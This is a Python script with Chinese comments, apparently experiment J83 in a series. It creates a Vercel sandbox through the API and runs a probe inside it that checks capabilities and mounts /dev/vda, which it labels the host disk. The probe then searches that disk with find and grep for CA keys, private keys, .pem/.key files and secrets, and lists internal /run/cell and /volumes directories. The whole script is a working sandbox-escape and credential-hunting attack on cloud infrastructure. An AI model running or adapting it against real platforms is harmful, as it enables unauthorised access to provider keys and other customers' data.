# 实验J83: 未patch沙箱 mount /dev/vda 宿主盘 (全caps验证) + 文件级搜索 ca-key/密钥
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return out

NAME = "expj83"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, subprocess

print("== [1] 当前 caps (未patch) ==", flush=True)
r = subprocess.run(["sh", "-c", "id && grep Cap /proc/self/status && ls -la /dev/vda /dev/vdb"], capture_output=True, text=True)
print(r.stdout, flush=True)

print("== [2] mount /dev/vda (未patch, 只读) ==", flush=True)
os.makedirs("/mnt/px", exist_ok=True)
r = subprocess.run(["mount", "-o", "ro", "/dev/vda", "/mnt/px"], capture_output=True, text=True)
print("mount rc:", r.returncode, flush=True)
print("stdout:", r.stdout[:300], flush=True)
print("stderr:", r.stderr[:300], flush=True)
if r.returncode == 0:
    print("== [3] 挂载成功: 宿主盘文件级访问 ==", flush=True)
    r = subprocess.run(["df", "-h", "/mnt/px"], capture_output=True, text=True)
    print(r.stdout, flush=True)
    r = subprocess.run(["ls", "/mnt/px"], capture_output=True, text=True)
    print("ls /mnt/px:", r.stdout[:600], flush=True)
    print("-- 搜索密钥/CA 文件 --", flush=True)
    r = subprocess.run(["sh", "-c",
        "find /mnt/px -xdev \\( -iname '*ca*key*' -o -iname '*.pem' -o -iname '*.key' -o -iname '*priv*' -o -iname '*secret*' \\) -type f 2>/dev/null | head -40"],
        capture_output=True, text=True)
    print(r.stdout[:2000], flush=True)
    print("-- 搜索全部 .pem/.key (含内容含 PRIVATE KEY) --", flush=True)
    r = subprocess.run(["sh", "-c",
        "grep -rl --include='*.pem' --include='*.key' --include='*.toml' -a 'PRIVATE KEY' /mnt/px 2>/dev/null | head -10; echo '---'; find /mnt/px -xdev -type f -size +10k -size -200k 2>/dev/null | head -30"],
        capture_output=True, text=True)
    print(r.stdout[:2000], flush=True)
    print("-- /run/cell 与 /volumes 结构 --", flush=True)
    r = subprocess.run(["sh", "-c", "ls -la /mnt/px/run/cell/ /mnt/px/volumes/ 2>/dev/null | head -40"], capture_output=True, text=True)
    print(r.stdout[:1500], flush=True)
    print("-- umount --", flush=True)
    r = subprocess.run(["umount", "/mnt/px"], capture_output=True, text=True)
    print("umount rc:", r.returncode, r.stderr[:100], flush=True)
else:
    print("mount failed, 尝试 mount -t xfs", flush=True)
    r = subprocess.run(["mount", "-t", "xfs", "-o", "ro", "/dev/vda", "/mnt/px"], capture_output=True, text=True)
    print("rc:", r.returncode, "stderr:", r.stderr[:300], flush=True)
"""
run_cmd(sid, PROBE, "mount-vda", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
